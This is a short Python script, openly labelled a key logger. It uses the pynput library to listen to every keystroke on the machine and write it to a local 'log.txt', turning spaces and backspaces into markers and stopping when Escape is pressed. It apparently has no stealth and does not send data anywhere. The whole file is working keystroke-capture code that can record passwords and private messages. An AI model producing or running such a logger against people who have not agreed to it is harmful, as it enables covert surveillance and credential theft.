import pynput

from pynput.keyboard import Key, Listener

# open the key logger file
log_file = open("log.txt", "a")

# clear the log file at the beginning of the program
log_file.truncate(0)

log_file.write("KEY LOGGER")
log_file.write("\n")
log_file.write("\n")

def on_press(key):
    # resets the file on each run and writes the key to the file
    if (key == Key.space):
        log_file.write(" ")

    # don't write anything if escape is pressed
    elif (key == Key.esc):
        log_file.write("")

    # simply write a known char for when backspace pressed
    elif (key == Key.backspace):
        log_file.write(" (RM:lastKey) ")

    else:
        # word wrap
        """if (getWordCount() >= 3):
            log_file.write("\n\n")"""

        # remove single quotes that surround letter
        typed = "{0}".format(key)
        typed = typed.replace("'", "")

        log_file.write(typed)

def on_release(key):
    # quits when the user presses escape
    if (key == Key.esc):
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# closes the file
log_file.close()
